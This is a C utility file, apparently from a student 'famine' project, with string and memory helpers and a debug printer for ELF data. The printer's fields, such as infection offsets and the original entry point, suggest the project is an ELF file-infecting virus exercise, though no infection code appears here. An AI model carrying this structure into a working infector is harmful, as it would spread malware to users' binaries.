/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   utils.c                                            :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: nguiard <marvin@42.fr>                     +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2024/10/31 13:23:11 by nguiard           #+#    #+#             */
/*   Updated: 2024/11/25 12:35:46 by nguiard          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "famine.h"

size_t	ft_strlen(str buff) {
	size_t	index = 0;

	while (buff[index])
		index++;

	return index;
}

//	Returns false if the two chuncks are not the same
bool	ft_memcmp(const byte *a, const byte *b, size_t size) {
	size_t	i = 0;

	while (i < size) {
		if (a[i] != b[i])
			return false;
		i++;
	}

	return true;
}

void	ft_memcpy(byte *dest, const byte *src, size_t size) {
	for (size_t i = 0; i < size; i++)
		dest[i] = src[i];
}

void	print_data(elf_data *data) {
	(void)data;
	printf("Data:\n");
	printf("elf\t\t\t\t%p\n", data->elf);
	printf("sections\t\t\t%p\n", data->sections);
	printf("segments\t\t\t%p\n", data->segments);
	printf("file\t\t\t\t%p\n", data->file);
	printf("fd\t\t\t\t%d\n", (int)data->fd);
	printf("\033[34msignature_offset_file\033[0m\t\t%lx\n", data->signature_offset_file);
	printf("\033[34msignature_offset_mem\t\t\033[0m%lx\n", data->signature_offset_mem);
	printf("\033[2;32minfection_offset_file\033[0m\t\t%lx\n", data->infection_offset_file);
	printf("\033[2;32minfection_offset_mem\t\t\033[0m%lx\n", data->infection_offset_mem);
	printf("\033[33moriginal_entry_point_file\033[0m\t%lx\n", data->original_entry_point_file);
	printf("\033[33moriginal_entry_point_mem\t\033[0m%lx\n", data->original_entry_point_mem);
}

char *ft_strstr(const char *haystack, const char *needle) {
	if (!*needle)
		return (char *)haystack;

	for (const char *h = haystack; *h; h++) {
		const char *h_sub = h;
		const char *n = needle;

		while (*h_sub && *n && *h_sub == *n) {
			h_sub++;
			n++;
		}

		if (!*n)
			return (char *)h;
	}

	return NULL;
}